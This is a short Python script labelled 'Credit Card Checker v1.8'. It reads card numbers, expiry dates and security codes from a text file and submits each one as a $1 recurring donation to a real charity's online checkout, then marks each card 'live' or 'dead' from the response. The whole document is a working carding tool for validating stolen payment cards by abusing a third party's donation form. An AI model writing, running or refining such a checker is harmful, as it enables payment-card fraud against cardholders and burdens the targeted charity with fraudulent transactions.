import requests
from colorama import init

req = requests.session()

print ("""
-----------------------------------------------
Credit Card Checker v1.8 By Comandator Estudios
-----------------------------------------------
""")

a = open("tarjetas.txt","r")
stop = "default"
file = [s.rstrip()for s in a.readlines()]
for lines in file:
    ccs = lines.split("|")
    param={
        "billing_address1":"afwafawwfaafa",
        "billing_city":"new york",
        "billing_country":"US",
        "billing_first_name":"comandator",
        "billing_last_name":"ereafsaf",
        "billing_postal_code":"10080",
        "raw_final_price":"1",
        "member_email_address":"safdasfsas@gmail.com",
        "member_first_name":"comandator",
        "member_last_name":"ereafsaf",
        "member_name":"comandator ereafsaf",
        "expirationMonth":ccs[1],
        "expirationYear":ccs[2],
        "securityCode":ccs[3],
        "token":ccs[0]
     }
    try:
        source = req.post("https://donate.wearethorn.org/give/186571/?amount=1&is_recurring=true#!/donation/checkout",data=param)
        if "invalid csrf token" in source.text:
            print ("\033[;31m"+"Tarjeta Muerta:", ccs[0], ccs[1], ccs[2], ccs[3])
        else:
            print ("\033[;32m"+"Tarjeta Viva:", ccs[0], ccs[1], ccs[2], ccs[3])
    except:
        break
    if stop in ccs[0]:
        break
